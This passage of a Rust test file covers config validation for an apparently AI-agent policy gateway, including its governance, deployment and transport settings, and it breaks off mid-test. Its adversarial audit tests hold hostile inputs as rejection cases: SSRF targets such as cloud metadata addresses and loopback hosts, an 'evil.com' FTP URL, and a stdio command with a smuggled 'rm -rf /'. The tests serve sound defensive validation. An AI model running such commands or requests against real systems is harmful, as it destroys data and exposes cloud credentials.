    assert_eq!(config.multimodal.max_video_size, 100 * 1024 * 1024);
    assert_eq!(config.multimodal.ocr_timeout_ms, 5000);
    assert!(!config.multimodal.enable_stego_detection);
    assert_eq!(config.multimodal.content_types, vec!["Image".to_string()]);
    assert!(config.multimodal.blocked_content_types.is_empty());
}

#[test]
fn test_multimodal_config_from_toml_full() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[multimodal]
enabled = true
enable_ocr = false
max_image_size = 20971520
max_audio_size = 104857600
max_video_size = 209715200
ocr_timeout_ms = 3000
min_ocr_confidence = 0.7
enable_stego_detection = true
content_types = ["Image", "Pdf", "Audio", "Video"]
blocked_content_types = ["Video"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.multimodal.enabled);
    assert!(!config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 20 * 1024 * 1024);
    assert_eq!(config.multimodal.max_audio_size, 100 * 1024 * 1024);
    assert_eq!(config.multimodal.max_video_size, 200 * 1024 * 1024);
    assert_eq!(config.multimodal.ocr_timeout_ms, 3000);
    assert!((config.multimodal.min_ocr_confidence - 0.7).abs() < f32::EPSILON);
    assert!(config.multimodal.enable_stego_detection);
    assert_eq!(config.multimodal.content_types.len(), 4);
    assert_eq!(config.multimodal.blocked_content_types, vec!["Video"]);
}

#[test]
fn test_multimodal_config_partial_override() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[multimodal]
enabled = true
content_types = ["Image", "Audio"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.multimodal.enabled);
    // Non-specified fields should have defaults
    assert!(config.multimodal.enable_ocr);
    assert_eq!(config.multimodal.max_image_size, 10 * 1024 * 1024);
    assert_eq!(config.multimodal.content_types.len(), 2);
    assert!(config.multimodal.blocked_content_types.is_empty());
}

#[test]
fn test_multimodal_config_json_roundtrip() {
    let config = MultimodalPolicyConfig {
        enabled: true,
        enable_ocr: true,
        max_image_size: 5_000_000,
        max_audio_size: 25_000_000,
        max_video_size: 50_000_000,
        ocr_timeout_ms: 2000,
        min_ocr_confidence: 0.6,
        enable_stego_detection: false,
        content_types: vec!["Image".into(), "Audio".into()],
        blocked_content_types: vec!["Video".into()],
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: MultimodalPolicyConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 26: GOVERNANCE CONFIG TESTS
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_defaults() {
    let config = GovernanceConfig::default();
    assert!(!config.shadow_ai_discovery);
    assert!(!config.require_agent_registration);
    assert_eq!(config.discovery_window_secs, 300);
    assert!(config.approved_tools.is_empty());
    assert!(config.known_servers.is_empty());
    assert!(config.registered_agents.is_empty());
    assert_eq!(
        config.least_agency_enforcement,
        vellaveto_types::EnforcementMode::Monitor
    );
    assert_eq!(config.auto_revoke_after_secs, 3600);
    assert!(config.emit_agency_audit_events);
}

#[test]
fn test_governance_config_serde_roundtrip() {
    let config = GovernanceConfig {
        shadow_ai_discovery: true,
        require_agent_registration: true,
        require_server_registration: true,
        discovery_window_secs: 600,
        approved_tools: vec!["filesystem".into(), "http".into()],
        known_servers: vec!["server-1".into()],
        registered_agents: vec!["agent-alpha".into(), "agent-beta".into()],
        least_agency_enforcement: vellaveto_types::EnforcementMode::Enforce,
        auto_revoke_after_secs: 7200,
        emit_agency_audit_events: false,
        ..GovernanceConfig::default()
    };
    let json = serde_json::to_string(&config).unwrap();
    let parsed: GovernanceConfig = serde_json::from_str(&json).unwrap();
    assert_eq!(config, parsed);
}

#[test]
fn test_governance_config_validation_rejects_zero_auto_revoke() {
    let config = GovernanceConfig {
        auto_revoke_after_secs: 0,
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_rejects_excessive_auto_revoke() {
    let config = GovernanceConfig {
        auto_revoke_after_secs: 999_999,
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_rejects_zero_discovery_window() {
    let config = GovernanceConfig {
        discovery_window_secs: 0,
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_governance_config_validation_accepts_valid() {
    let config = GovernanceConfig::default();
    assert!(config.validate().is_ok());
}

#[test]
fn test_governance_config_in_policy_config() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[governance]
shadow_ai_discovery = true
require_agent_registration = true
approved_tools = ["fs", "http"]
auto_revoke_after_secs = 7200
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.governance.shadow_ai_discovery);
    assert!(config.governance.require_agent_registration);
    assert_eq!(config.governance.approved_tools, vec!["fs", "http"]);
    assert_eq!(config.governance.auto_revoke_after_secs, 7200);
}

#[test]
fn test_governance_config_absent_uses_defaults() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.governance.shadow_ai_discovery);
    assert_eq!(config.governance.auto_revoke_after_secs, 3600);
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-017: registered_agents config field
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_registered_agents_serde() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[governance]
shadow_ai_discovery = true
require_agent_registration = true
registered_agents = ["agent-alpha", "agent-beta"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(
        config.governance.registered_agents,
        vec!["agent-alpha", "agent-beta"]
    );
}

#[test]
fn test_governance_config_registered_agents_defaults_empty() {
    let config = GovernanceConfig::default();
    assert!(config.registered_agents.is_empty());
}

#[test]
fn test_governance_config_validation_rejects_too_many_registered_agents() {
    let config = GovernanceConfig {
        registered_agents: (0..10_001).map(|i| format!("agent-{i}")).collect(),
        ..GovernanceConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("registered_agents"));
}

#[test]
fn test_governance_config_validation_rejects_overlong_agent_id() {
    let config = GovernanceConfig {
        registered_agents: vec!["a".repeat(257)],
        ..GovernanceConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("registered_agents"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_agent_id() {
    let config = GovernanceConfig {
        registered_agents: vec!["a".repeat(256)],
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-047: Per-string length validation on approved_tools/known_servers
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_validation_rejects_overlong_tool_name() {
    let config = GovernanceConfig {
        approved_tools: vec!["t".repeat(257)],
        ..GovernanceConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("approved_tools"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_tool_name() {
    let config = GovernanceConfig {
        approved_tools: vec!["t".repeat(256)],
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_governance_config_validation_rejects_overlong_server_id() {
    let config = GovernanceConfig {
        known_servers: vec!["s".repeat(513)],
        ..GovernanceConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("known_servers"));
}

#[test]
fn test_governance_config_validation_accepts_max_length_server_id() {
    let config = GovernanceConfig {
        known_servers: vec!["s".repeat(512)],
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════════════════════════
// FIND-R44-048: Upper bound on discovery_window_secs
// ═══════════════════════════════════════════════════════════════════════════════

#[test]
fn test_governance_config_validation_rejects_excessive_discovery_window() {
    let config = GovernanceConfig {
        discovery_window_secs: 86_401, // > 24 hours
        ..GovernanceConfig::default()
    };
    let result = config.validate();
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("discovery_window_secs"));
}

#[test]
fn test_governance_config_validation_accepts_max_discovery_window() {
    let config = GovernanceConfig {
        discovery_window_secs: 86_400, // exactly 24 hours
        ..GovernanceConfig::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// Phase 27: Deployment configuration tests
// ═══════════════════════════════════════════════════

#[test]
fn test_deployment_config_defaults() {
    let config = crate::DeploymentConfig::default();
    assert_eq!(config.mode, crate::DeploymentMode::Standalone);
    assert!(!config.leader_election.enabled);
    assert_eq!(config.leader_election.lease_duration_secs, 15);
    assert_eq!(config.leader_election.renew_interval_secs, 10);
    assert_eq!(config.leader_election.retry_period_secs, 5);
    assert_eq!(
        config.service_discovery.mode,
        crate::ServiceDiscoveryMode::Static
    );
    assert_eq!(config.service_discovery.refresh_interval_secs, 30);
    assert!(config.instance_id.is_none());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_config_serde_roundtrip() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[deployment]
mode = "kubernetes"
instance_id = "vellaveto-0"

[deployment.leader_election]
enabled = true
lease_duration_secs = 20
renew_interval_secs = 15
retry_period_secs = 3

[deployment.service_discovery]
mode = "dns"
dns_name = "vellaveto-headless.default.svc.cluster.local"
refresh_interval_secs = 15
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.deployment.mode, crate::DeploymentMode::Kubernetes);
    assert_eq!(
        config.deployment.instance_id,
        Some("vellaveto-0".to_string())
    );
    assert!(config.deployment.leader_election.enabled);
    assert_eq!(config.deployment.leader_election.lease_duration_secs, 20);
    assert_eq!(
        config.deployment.service_discovery.mode,
        crate::ServiceDiscoveryMode::Dns
    );
    assert_eq!(
        config.deployment.service_discovery.dns_name,
        Some("vellaveto-headless.default.svc.cluster.local".to_string())
    );
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_config_absent_uses_defaults() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.deployment.mode, crate::DeploymentMode::Standalone);
    assert!(!config.deployment.leader_election.enabled);
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_leader_election_lease_too_short() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 2;
    let err = config.validate().unwrap_err();
    assert!(err.contains("lease_duration_secs"));
}

#[test]
fn test_deployment_leader_election_lease_too_long() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 400;
    let err = config.validate().unwrap_err();
    assert!(err.contains("lease_duration_secs"));
}

#[test]
fn test_deployment_leader_election_renew_exceeds_lease() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.lease_duration_secs = 10;
    config.leader_election.renew_interval_secs = 10; // equal, not less
    let err = config.validate().unwrap_err();
    assert!(err.contains("renew_interval_secs"));
}

#[test]
fn test_deployment_leader_election_retry_out_of_range() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = true;
    config.leader_election.retry_period_secs = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("retry_period_secs"));
}

/// SECURITY (FIND-R213-003): Structural bounds must be validated even when
/// leader election is disabled. Invalid values persisted while disabled would
/// cause immediate failure on hot-enable.
#[test]
fn test_deployment_leader_election_disabled_still_validates_bounds() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = false;
    config.leader_election.lease_duration_secs = 2; // below [5, 300]
    let err = config.validate().unwrap_err();
    assert!(err.contains("lease_duration_secs"));
}

#[test]
fn test_deployment_leader_election_disabled_rejects_zero_renew() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = false;
    config.leader_election.renew_interval_secs = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("renew_interval_secs"));
}

#[test]
fn test_deployment_leader_election_disabled_rejects_retry_out_of_range() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = false;
    config.leader_election.retry_period_secs = 0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("retry_period_secs"));
}

/// When disabled, renew >= lease is not a semantic error (only checked when enabled).
#[test]
fn test_deployment_leader_election_disabled_allows_renew_ge_lease() {
    let mut config = crate::DeploymentConfig::default();
    config.leader_election.enabled = false;
    config.leader_election.lease_duration_secs = 10;
    config.leader_election.renew_interval_secs = 10; // equal — only invalid when enabled
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_service_discovery_dns_requires_name() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = None;
    let err = config.validate().unwrap_err();
    assert!(err.contains("dns_name"));
}

#[test]
fn test_deployment_service_discovery_dns_empty_name_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("  ".to_string());
    let err = config.validate().unwrap_err();
    assert!(err.contains("dns_name"));
}

#[test]
fn test_deployment_service_discovery_refresh_out_of_range() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.refresh_interval_secs = 2;
    let err = config.validate().unwrap_err();
    assert!(err.contains("refresh_interval_secs"));
}

#[test]
fn test_deployment_instance_id_too_long() {
    let config = crate::DeploymentConfig {
        instance_id: Some("a".repeat(254)),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("instance_id"));
}

#[test]
fn test_deployment_instance_id_empty_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some("".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("instance_id"));
}

#[test]
fn test_deployment_instance_id_invalid_chars() {
    let config = crate::DeploymentConfig {
        instance_id: Some("Vellaveto_0".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("DNS-safe"));
}

#[test]
fn test_deployment_instance_id_leading_hyphen() {
    let config = crate::DeploymentConfig {
        instance_id: Some("-vellaveto-0".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("hyphen"));
}

#[test]
fn test_deployment_effective_instance_id_configured() {
    let config = crate::DeploymentConfig {
        instance_id: Some("my-instance".to_string()),
        ..crate::DeploymentConfig::default()
    };
    assert_eq!(config.effective_instance_id(), "my-instance");
}

#[test]
fn test_deployment_valid_kubernetes_config() {
    let config = crate::DeploymentConfig {
        mode: crate::DeploymentMode::Kubernetes,
        leader_election: crate::LeaderElectionConfig {
            enabled: true,
            lease_duration_secs: 30,
            renew_interval_secs: 20,
            retry_period_secs: 5,
        },
        service_discovery: crate::ServiceDiscoveryConfig {
            mode: crate::ServiceDiscoveryMode::Dns,
            dns_name: Some("vellaveto-headless.default.svc.cluster.local".to_string()),
            ..crate::ServiceDiscoveryConfig::default()
        },
        instance_id: Some("vellaveto-0".to_string()),
    };
    assert!(config.validate().is_ok());
}

// =========================================================================
// Adversarial Tests — Phase 27 (FIND-P27-005, FIND-P27-007)
// =========================================================================

#[test]
fn test_deployment_dns_name_ssrf_localhost_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("localhost:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_127_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("127.0.0.1:8080".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_127_subnet_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("127.99.99.99:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_aws_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.169.254:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("metadata") || err.contains("link-local"),
        "expected metadata rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_gcp_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("metadata.google.internal:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("metadata") || err.contains("internal"),
        "expected metadata rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_link_local_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.0.1:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("link-local"),
        "expected link-local rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_zero_address_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("0.0.0.0:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_ipv6_loopback_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("[::1]:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_ssrf_internal_suffix_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("evil.internal:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("metadata") || err.contains("internal"),
        "expected internal rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_valid_headless_service_accepted() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name =
        Some("vellaveto-headless.prod.svc.cluster.local:3000".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_instance_id_leading_dot_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some(".my-instance".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {err}");
}

#[test]
fn test_deployment_instance_id_trailing_dot_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some("my-instance.".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {err}");
}

#[test]
fn test_deployment_instance_id_consecutive_dots_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some("my..instance".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("consecutive dots"),
        "expected consecutive dots rejection: {err}"
    );
}

#[test]
fn test_deployment_instance_id_dot_only_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some(".".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {err}");
}

#[test]
fn test_deployment_instance_id_double_dot_only_rejected() {
    let config = crate::DeploymentConfig {
        instance_id: Some("..".to_string()),
        ..crate::DeploymentConfig::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("dot"), "expected dot rejection: {err}");
}

#[test]
fn test_deployment_instance_id_valid_fqdn_style_accepted() {
    let config = crate::DeploymentConfig {
        instance_id: Some("vellaveto-0.prod".to_string()),
        ..crate::DeploymentConfig::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_dns_name_case_insensitive_ssrf_check() {
    // Verify that uppercase bypass attempts are caught
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("LOCALHOST:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("loopback"),
        "expected case-insensitive loopback rejection: {err}"
    );
}

#[test]
fn test_deployment_dns_name_azure_metadata_rejected() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("169.254.165.254:80".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("link-local") || err.contains("metadata"),
        "expected metadata/link-local rejection: {err}"
    );
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R44-014): HOSTNAME env var validation
// ═══════════════════════════════════════════════════════

#[test]
fn test_deployment_effective_instance_id_hostname_valid() {
    // When instance_id is not set and HOSTNAME is valid, use HOSTNAME.
    // We can't reliably set env vars in parallel tests, so we test the
    // validate_instance_id helper indirectly via effective_instance_id.
    let config = crate::DeploymentConfig::default();
    // Whatever effective_instance_id returns, it should be DNS-safe.
    let eid = config.effective_instance_id();
    assert!(!eid.is_empty());
    // The result should always pass validation (either from HOSTNAME or fallback).
    assert!(
        eid.chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '.')
            || eid == "vellaveto-unknown",
        "effective_instance_id should be DNS-safe, got '{eid}'"
    );
}

#[test]
fn test_deployment_effective_instance_id_configured_takes_precedence() {
    let config = crate::DeploymentConfig {
        instance_id: Some("my-pod-0".to_string()),
        ..crate::DeploymentConfig::default()
    };
    assert_eq!(config.effective_instance_id(), "my-pod-0");
}

#[test]
fn test_deployment_validate_instance_id_rejects_uppercase() {
    // The validate_instance_id helper (used by effective_instance_id for HOSTNAME)
    // should reject uppercase characters.
    let result = crate::deployment::validate_instance_id("MY-HOST");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_spaces() {
    let result = crate::deployment::validate_instance_id("my host");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_empty() {
    let result = crate::deployment::validate_instance_id("");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_too_long() {
    let long = "a".repeat(254);
    let result = crate::deployment::validate_instance_id(&long);
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_leading_hyphen() {
    let result = crate::deployment::validate_instance_id("-pod-0");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_trailing_dot() {
    let result = crate::deployment::validate_instance_id("pod-0.");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_rejects_consecutive_dots() {
    let result = crate::deployment::validate_instance_id("pod..0");
    assert!(result.is_err());
}

#[test]
fn test_deployment_validate_instance_id_accepts_valid() {
    assert!(crate::deployment::validate_instance_id("vellaveto-0").is_ok());
    assert!(crate::deployment::validate_instance_id("pod-0.prod").is_ok());
    assert!(crate::deployment::validate_instance_id("a").is_ok());
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R44-045): .local TLD warning
// ═══════════════════════════════════════════════════════

#[test]
fn test_deployment_dns_name_local_tld_accepted_with_warning() {
    // .local TLD should be accepted (no reject) but would log a warning.
    // We verify it does not error.
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("myservice.local:8080".to_string());
    assert!(
        config.validate().is_ok(),
        ".local TLD should be accepted (with warning)"
    );
}

#[test]
fn test_deployment_dns_name_svc_cluster_local_accepted_no_warning() {
    // .svc.cluster.local should be accepted without warning.
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name =
        Some("vellaveto-headless.default.svc.cluster.local:3000".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_deployment_dns_name_random_local_not_k8s_accepted() {
    // A .local name that is NOT .svc.cluster.local should still be accepted
    // (only a warning, not a rejection).
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.mode = crate::ServiceDiscoveryMode::Dns;
    config.service_discovery.dns_name = Some("printer.local:631".to_string());
    assert!(
        config.validate().is_ok(),
        "non-k8s .local should be accepted"
    );
}

// ═══════════════════════════════════════════════════════
// Adversarial audit tests (FIND-R42-008, R42-009, R42-013, R42-015)
// ═══════════════════════════════════════════════════════

/// FIND-R42-008: backend.url must use http:// or https:// scheme.
#[test]
fn test_gateway_backend_url_scheme_validation() {
    let config = crate::GatewayConfig {
        enabled: true,
        backends: vec![crate::BackendConfig {
            id: "test".to_string(),
            url: "ftp://evil.com/mcp".to_string(),
            tool_prefixes: vec![],
            weight: 100,
            transport_urls: std::collections::HashMap::new(),
        }],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("http://") || err.contains("https://"),
        "expected scheme error: {err}"
    );
}

/// FIND-R42-008: Valid http:// and https:// schemes pass validation.
#[test]
fn test_gateway_backend_url_valid_schemes() {
    for scheme in &["http://localhost:8080/mcp", "https://example.com/mcp"] {
        let config = crate::GatewayConfig {
            enabled: true,
            backends: vec![crate::BackendConfig {
                id: "test".to_string(),
                url: scheme.to_string(),
                tool_prefixes: vec![],
                weight: 100,
                transport_urls: std::collections::HashMap::new(),
            }],
            ..Default::default()
        };
        assert!(
            config.validate().is_ok(),
            "valid scheme {scheme} should pass"
        );
    }
}

/// FIND-R42-009: "*" wildcard with other overrides is rejected.
#[test]
fn test_transport_overrides_wildcard_with_others_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "*".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    overrides.insert(
        "fs_*".to_string(),
        vec![vellaveto_types::TransportProtocol::Grpc],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("wildcard"),
        "expected wildcard rejection: {err}"
    );
}

/// FIND-R42-009: "*" wildcard alone is allowed.
#[test]
fn test_transport_overrides_wildcard_alone_ok() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "*".to_string(),
        vec![vellaveto_types::TransportProtocol::Http],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R42-013: Duplicate protocols in override values rejected.
#[test]
fn test_transport_overrides_duplicate_protocols_rejected() {
    let mut overrides = std::collections::HashMap::new();
    overrides.insert(
        "fs_*".to_string(),
        vec![
            vellaveto_types::TransportProtocol::Http,
            vellaveto_types::TransportProtocol::Http,
        ],
    );
    let config = crate::TransportConfig {
        transport_overrides: overrides,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate"), "expected duplicate error: {err}");
}

/// FIND-R42-015: Duplicate protocols in upstream_priorities rejected.
#[test]
fn test_upstream_priorities_duplicate_rejected() {
    let config = crate::TransportConfig {
        upstream_priorities: vec![
            vellaveto_types::TransportProtocol::Http,
            vellaveto_types::TransportProtocol::Grpc,
            vellaveto_types::TransportProtocol::Http,
        ],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("duplicate"), "expected duplicate error: {err}");
}

// ═══════════════════════════════════════════════════
// ADVERSARIAL AUDIT ROUND 43 TESTS
// ═══════════════════════════════════════════════════

/// FIND-R43-001: stdio_command validated even when stdio_fallback_enabled is false.
/// A malicious command stored in config could be activated later (config reload, flag toggle)
/// without re-validation.
#[test]
fn test_r43_001_stdio_command_validated_when_disabled() {
    // Shell metacharacters in command should be rejected even with fallback disabled.
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("/usr/bin/cmd; rm -rf /".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("shell metacharacters"),
        "expected shell metacharacter rejection: {err}"
    );
}

/// FIND-R43-001: Relative path rejected even when fallback disabled.
#[test]
fn test_r43_001_stdio_command_relative_path_rejected_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("relative-path/server".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("absolute path"),
        "expected absolute path rejection: {err}"
    );
}

/// FIND-R43-001: Valid command passes when disabled.
#[test]
fn test_r43_001_stdio_command_valid_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("/usr/bin/mcp-server".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-001: Empty stdio_command passes when disabled (not required).
#[test]
fn test_r43_001_stdio_command_empty_passes_when_disabled() {
    let config = crate::TransportConfig {
        stdio_fallback_enabled: false,
        stdio_command: Some("  ".to_string()),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

/// FIND-R43-001: None stdio_command passes when disabled.
#[test]
fn test_r43_001_stdio_command_none_passes_when_disabled() {
